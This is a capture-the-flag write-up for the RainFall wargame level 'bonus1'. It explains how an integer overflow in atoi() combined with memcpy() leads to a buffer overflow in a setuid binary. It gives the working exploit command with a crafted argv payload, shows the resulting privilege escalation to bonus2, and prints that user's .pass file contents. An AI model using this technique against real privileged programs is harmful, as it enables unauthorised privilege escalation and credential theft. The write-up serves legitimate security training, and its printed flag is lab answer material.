# Bonus1

## 1. Context

```bash
$ id
uid=2011(bonus1) gid=2011(bonus1) groups=2011(bonus1),100(users)

$ pwd
/home/user/bonus1

$ ls -la
[...]
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
[...]
```

## 2. Program behavior

```bash
$ ./bonus1
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 42
```

Expects an input and does nothing.

## 3. Code overview

We have only a `main()` function.
The program reads `av[1]` and converts it to an integer.
If `nb <= 9`, it copies `nb * 4` bytes from `av[2]` to a 40-byte buffer -> buffer overflow.
Then, it launches a shell if `nb == 0x574f4c46`, otherwise exits the program. 

## 4. Exploit

We have to find a way to validate `nb <= 9` and `nb == 0x574f4c46`.

The vulnerability is an **integer overflow leading to a buffer overflow**, caused by the **combination** of `atoi()` **and** `memcpy()`.

Just to know : `0x574f4c46 = 1464814662 = "FLOW"`.

Our `int` is **32 bits**. When multiplying a large negative value by `4`, the result overflows.
Only the **lower 32 bits are kept**.

We can provide a **negative number** so it can **overflow**.

See the `main.c`.

`-2147483637` is perfect.

## 5. Getting the flag

```bash
$ ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

End of simulation
